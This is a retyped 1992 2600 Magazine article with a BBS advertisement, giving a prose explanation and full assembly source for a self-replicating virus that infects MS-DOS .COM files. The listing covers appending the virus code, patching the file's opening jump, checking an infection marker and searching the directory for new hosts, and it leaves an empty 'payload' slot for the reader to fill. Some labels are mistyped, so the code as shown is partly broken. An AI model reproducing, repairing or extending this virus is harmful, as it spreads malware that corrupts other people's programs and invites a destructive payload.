******************************************************************************
              This Was Taken From 2600 Magazine Spring 1992
                  Typing Work Done by OMEGA/MEGA-Ind.
         Call Europe's Biggest H/P/A/V Board on +31-(0)79-426-079
******************************************************************************

                 An MS-DOS Virus (By The Paranoid Panda)
        -----------------------------------------

The MS-DOS *.COM File is the simplest of all executable files. This format was
included in MS-DOS to provide compatibility with the CP\M operating system.
Allthough CP\M seems to be largely a thing of the past, *.COM files are still
being produced, so there is plenty of opportunity for infection.
As with the Atari virus I Gave you in Spring 1991 issue of 2600, this virus is
designed to infect executable files while still rendering them capable of 
fully performing their original, intended functions. Consequently, this is not
an overwrite virus, and preserves all of the infected file's original code.
The *.COM file has no program header, as do *.EXE files, and has no file 
trailer such as Atari *.PGM, *.TOS and *.TTP program files do. All the *.COM
file has is executable 80x86 instructions. It must be capable of loading in one
segment (64 Kbytes), along with the Program Segment Prefix (PSP) Created by 
MS-DOS at load time, as well as the two byte stack which is automatically 
created. Hence, the complete *.COM file must always be 64 Kbytes, less 256 
Bytes for the PSP, less 2 bytes for the stack. As a result, a candidate file
for infection must be short enough so that when its length is increased by the
length of the virus, it will still not exceed this maximum length, and MS-DOS
will still load it for execution.
MS-DOS will load *.COM files at offset 100 hex (100h using the MicroSoft 
Assembler notation), and all memory references in the program are short (i.e.
16 bit) addresses. This is, in essence, an absolute encoding and addressing
scheme, so that the virus code cannot be added at the beginning while moving
all the original code down in the address by the length of the virus.
The only way to add the virus is at the end, and to insert a short jump to the
virus beginning at the start of the file. This means that the first three 
bytes of the original code will be destroyed, so the virus must save these
three bytes between the end of the file's code and the beginning of the virus
code. Once the virus has completed execution, it restores the original three
to the file's beginning in RAM, and jumps there.
The comments in the accompanying listing pretty well tell the rest of the 
story, but a few words are still in order. There is a space in the code, at
symbolic location "payload:" for insertion of code which does the actual
"dirty work" of the virus. All you will find ther is a single "no op" in-
struction. You can add whatever you think best at that point. This code is
supplied for instructional purpose only, and all that clap-trap.
Note also that this particular version of the virus does not perform a very
sophisticated search for candidates for infection. The search will only be
performed in the directory where the already infected file resides, and does
not search any subdirectories. That's easy enough to fix, ans as the college
text books say, that is an exercise which is left to the student.

Happy Computing!



-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

PAGE,120
;Taken From The 2600 Magazine Spring 1992 Volume Nine, Number One! Page 4-7
;Typing work done by OMEGA/MEGA-Ind. On 31th may 92.
;File Virus.asm - This is the launch program for the Mark II virus
;It is to be assembled, linked, and converted to a *.com file using
;EXE2BIN. When run, it looks within the defined search space for other
;COM files to infect, and infects them. Then it runs its payload module.
;This launch program is structured like an infected file, so it contains
;a "dummy" host program like that which would be in an infected file.
;Control is returned to this dummy host program when this program runs.
;In the infected file, control will be returned to the actual program
;it contains after the payload module of its parasitic virus runs.
           _VIRUS SEGMENT
           ASSUME cs:_VIRUS,ds:_VIRUS,ss:_VIRUS
           ORG 100h
;This is the start of the dummy host program. Control is transferred
;here after the virus runs. All it does is terminate the program with
;a normal MS-DOS termination call, after having put out a message
;informing that the program has terminated normally.

;The next instruction is what is actually intended to be
;in the dummy host program. It is the beginning of the code which
;sets up the DOS call to write the termination message on the screen.
;The infected program which would have infected this one would have
;inserted a jump to the beginning of the virus over this, after saving
;what was actually there. When the virus completes, it will restore
;the parts of the mangled original host code, and run the host program.
;
;          mov bx,1
;
;What you see encoded below, using the "db" assembler pseudo-op, is
;the hand encoded jump to the beginning of the virus, installed by the
;program which would have infected this one. As it happens, the jump
;written into the beginning is the same length as the instruction
;(mov bx,1) which was there in the first place. In general, there
;is no guarantee just what will be there, and how long it will be.
;Since the program being infected is a COM program, the only guarantee
;is that the file will begin with some executable instruction. Thus,
;the program getting infected may have part of an executable instruction
;mangled by the inserted jump, or possibly one entire instruction plus
;part of another.
;
;The inserted code begins with "E9", the op-code byte for a jump relative
;to the contents of the IP as it will look after the jump plus displacement
;is fetched. (The IP will contain 103h. COM programs begin at offset
;100h, and the jump plus displacement requires 3 bytes.) The Next two
;bytes are the displacement to the beginning of the virus. The 
;displacement is calculated by the infecting program, as follows:
;
;D = displacement to be added to current IP (=103) to get to
;    virus start.
;D = Uninfected file length
;  -
;  Current IP (=103)
;  +
;  4 bytes storage space for the overwritten first instruction.
;
;  If the uninfected length of the target file is odd, a zero byte
;  will be added at its end before the virus code is attached.
;
;  The virus will thus begin on a word boundary, and NOP's inserted
;  by the assembler to put other things on a word boundary will still
;  perform their intended purpose.
;
filelength EQU begin-start
start:          db 0E9h             ;Op-code for jump
        dw filelength+4-3   ;Displacement calculation
        mov cx,lmessage
        mov dx,OFFSET message
        mov ah,40h
        int 21h             ;Put termination message on the screen
        mov ah,4Ch      ;Function number of normal pgm termination
        int 21h         ;Call DOS and terminate.

message: db"Launch program has terminated normally.",0Dh,0Ah,0
lmessage EQU $-message

;This ends the dummy host program. What follows is the actual virus,
;which will be copied into the target file.

virlength EQU finish-begin+102h     ;Length of virus + PSP + initial stack.

begin:      db 0bbh,01,00       ;The instruction "mov bx,1" which
                    ;would have been saved here by the
                    ;infected program.
        db 00           ;Make sabe bin 4 bytes total.

virusbegin:             ;The beginning of the actual virus code.
;Get and save the base address of the virus.
        mov bp,101h         ;Address of LSB of jump displacement
        mov bx,WORDPTR[bp]  ;Get displacement in bx
        add bx,103h     ;Add IP contents after first instruction
                    ;Now bx contains address of 
                        ;"virusbegin:"
        mov bp,100h         ;Beginning of pgm, where original
                    ;instruction will be restored.
        mov dl,[bx-4]
        mov [bp],dl     ;First byte
        mov dl,[bx-3]
        mov [bp+1],dl       ;Second byte
        mov dl,[bx-2]
        mov [bp+2],dl       ;Third byte
        push bx         ;Save the actual start of virus.

;########## STACK POINTER INFO:One word pushed on stack ###########

;********** Beginning of the Infection Module ***************

;First, search for an uninfected candidate file. If one is found,
;infect it before running the payload module. If none is found,
;proceed directly with the payload Module.

;Use function SFIRST (Int 21h,fn. 4Eh) to get a candidate file.
        jmp sfirst       ;Jump over wildcard string

wildcard: db "*.com",0           ;Wildcard name for COM files

sfirst:     mov ah,4Eh       ;Function no. of SFIRST
        pop dx           ;Get base address of virus start
        push dx          ;Restore the stack pointer
        add dx,wildcard-virusbegin    ;Add distance to string.
        mov cx,0         ;Attribute word=seek normal files
        int 21h          ;Call DOS
        jnc over1        ;Found one.
        jmp payload      ;Otherwise, no COM files, do payload.

;Now that a candidate file is found, make sure that when the virus is
;added, it will not be too long to be a COM file. COM file maximum
;length is 64kbytes less 100h bytes for the PSP, less two bytes for the 0
;bytes added on the stack by the operating system on loading.

over1:      mov bx,80h+1Ah       ;Address in PSP/PCB containing
                     ;file length.
        mov ax,virlength     ;Length of virus
        add ax,[bx]      ;Will get overflow if file length 
                     ;too big.
        jno checkinfect      ;No overflow, keep going.
        jmp snext        ;This file too big to infect, try another

;A candidate file has been found. Determine if it is infected, or 
;go on to the next one.
checkinfect:

;Open the file.
fileopen:   mov ah,3Dh       ;Hn. no of OPEN WITH HANDLE
        mov al,02        ;Open for read/write access.
        mov dx,80h+1Eh       ;Location in DTA of file name
        int 21h          ;Call DOS.
        jnc opened       ;Open was successful, continue
        jmp snext        ;Cannot open this file, look for more.
opened:     push ax          ;Save file handle.

;##########  STACK POINTER INFO: Two words pushed on stack #############
         
;Open was successful, move the file pointer to the infection marker.
        mov ah,42h       ;fn. no. of LSEEK
        mov al,02        ;Measure offset from end of file
        pop bx           ;Get file handle.
        push bx          ;Keep file handle on top of stack
        mov cx,0FFFFh        ;MSB of offset from end.
                     ;Sign extend.
        mov dx,0FFFCh        ;LSB of infection marker.
                     ;File end -4.
        int 21h          ;Call DOS.
        jnc over3        ;No error, continue.
        jmp closefile        ;Error occurred, close this one
                     ;and look again.

;Read the last four bytes.
over3:      mov ah,3Fh       ;Fn. no of READ
        pop bx           ;Get file handle.
        pop dx           ;Get address of "virusbegin:"
        push dx          ;Restore to stack
        push bx          ;Restore file handle on stack.
        add dx,-4        ;Move pointer back to start of save bin.
        mov cx,4         ;Read 4 bytes
        int 21h          ;Call DOS
        jnc over4        ;No error, keep going.
        jmp closefile        ;Error occurred, close this one,
                     ;look again.

;Compare the last four bytes with the infection marker.
over4:      pop bx           ;Take file handle off to get to adr.
        pop bp           ;Get address of "virusbegin:"
        push bp          ;Restore buffer address
        push bx              ;Restore file handle.
        mov bh,[bp-4]        ;First byte
        mov bl,[bp-3]        ;Second byte
        xor bx,0001h         ;First half match?
        jnz over5        ;First half doesn't match, continue.
over4a:     mov bh,[bp-2]        ;Third byte
        mov bl,[bp-1]        ;Fourth byte
        xor bx,0FFE0h        ;Second half match?
        jnz over5        ;No match. Continue.
        jmp closefile        ;Matches marker. Close and try again.

;File is not infected. Proceed to infect.
;
;Move file pointer to beginning of file.
over5:      mov ah,42h       ;Fn. no. of LSEEK
        pop bx           ;File handle in bx.
        push bx          ;Keep the stack equalized.
        mov al,00        ;Offset from file beginning.
        mov cx,0         ;Offset = 0
        mov dx,0         ;Offset = 0
        int 21h          ;Call DOS
        jnc over6        ;No error, continue
        jmp closfile         ;Error, try another file.

;Save the first three bytes in the buffer.
over6:      mov ah,3Fh       ;Fn. no. of READ
        pop bx           ;Get the file handle
        pop dx           ;Beginning of buffer
        push dx          ;Restore the stack
        push bx          ;Restore the stack
        add dx,-4        ;Move pointer to start of save bin.
        mov cx,3         ;Read 3 bytes
        int 21h          ;Call DOS
        mov al,0         ;Zero byte for fourth loc. in save bin.
        add dx,3         ;Reg. dx points to fourth loc in save bin
        mov bp,dx        ;Place in base pointer for index.
        mov [bp],al      ;Write zero byte in fourth loc.

;Move file pointer back to the beginning of the file.
        mov ah,42h       ;Fn. no. of LSEEK
        pop bx           ;File handle in bx.
        push bx          ;Restore the stack
        mov al,00        ;Offset from file beginning
        mov cx,0         ;Zero offset
        mov dx,0         ;Zero offset
        int 21h          ;Call DOS
        jnc past         ;No error, continue
        jmp closefile        ;Error, try another file

;Overwrite the first three bytes with a jump to virus beginning.
tembuf:     db 0E9h,0,0
past:       pop bx           ;Get file handle
        pop bp           ;Get actual address of "virusbegin"    
        push bp          ;Equalize stack
        push bx          ;Equalize stack 
        mov si,80h+1Ah       ;Location in DTA of file length
        mov ax,[si]      ;Get target file length in ax
        xchg ah,al       ;Swap halves temporarily
        sahf             ;Lower byte of file length to flag reg.
        xchg ah,al       ;Swap back
        jnc noadd        ;LSB of ax into carry. Jump if c(ax) even.
        add ax,1         ;Else, add one to c(ax) to make
                     ;result even.
noadd:      add ax,1         ;Total jump is file length -3+1
        add bp,tempbuf-virusbegin  ; Get address of tempbuf in bp
        mov [bp+1],al        ;First displacement byte
        mov [bp+2],ah        ;Second displacement byte
        mov dx,bp        ;Start of buffer to dx
        mov ah,40h       ;Function no. of WRITE
        mov cx,3         ;Write 3 Bytes
        int 21h          ;Call DOS

;Move the file pointer to the end of the file.
        mov ah,42h       ;Fn. no. of LSEEK
        mov al,02        ;Offset measured from end.
        mov cx,0         ;Zero offset
        mov dx,0         ;Zero offset
        pop bx           ;Get file handle
        push bx          ;Restore the stack
        int 21h          ;Call DOS

;Check target file length. If odd, add a 0 byte at the end.
        mov bp,80h+1Ah       ;Address of lower byte of file length
        mov ax,[bp]      ;Get lower byte in ax for comparison
        and ax,1         ;Get lsb of file length
        jz skip          ;Skip if file length even
        mov ah,40h       ;Fn. no. of WRITE
        pop bx           ;Get file handle
        pop bp           ;Address of "virusbegin"
        push bp          ;Equalize stack
        push bx          ;Equalize stack
        add bp,-1        ;Move pointer just behind saved 3 bytes
        mov dx,bp        ;Location of one byte buffer
        mov cx,1         ;Write one byte
        mov [bp],ch      ;Zero byte to be written
        int 21h          ;Call DOS

;Write the virus onto the end of the target file.
skip:       mov ah,40h       ;Fn. no. of WRITE
        mov cx,finish-begin  ;No. of bytes to be written equals 4 byte
                     ;save bin plus virus executable code.
        pop bx           ;Get file handle
        pop dx           ;Address of "virusbegin"
        push dx          ;Equalized stack
        push bx          ;Equalized stack
        add dx,-4        ;Include saved first three bytes.
        int 21h          ;Call DOS
        pop bx           ;Get file handle
        mov ah,3Eh       ;Fn. no. of CLOSE
        int 21h          ;Close file for good.
        jmp payload      ;Infection complete. Run the virus
                         ;payload.

closefile:  pop bx           ;Get file handle off stack permanently
        mov ah,3Eh       ;Fn. no. of CLOSE
        int 21h          ;Call DOS

; ########### STACK POINTER INFO:One word pushed on stack ###########

snext:      mov ah,4Fh       ;Function no. of SNEXT
        int 21h          ;Call DOS
        jc payload       ;If error, just go and do payload.
        jmp fileopen         ;Otherwise, try to infect this one

; *********** End of the Infection Module ************

; ************** Beginning of the Payload Module. **********
payload:    nop
; ************** End of the Payload Module ************

;Time to finish up. Restore the stack and jump to cs:100h

        pop bp
;############# STACK POINTER INFO:Nothing left on stack ###########
        mov ax,100h
        jmp ax
finish:

_VIRUS ENDS
   END start

;                 Remember Where You Saw it First
;   -----------> Perfect Crime : +31-(0)-79-426-079 <-------------
;                Typing Work Done by OMEGA/MEGA-Ind.

-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
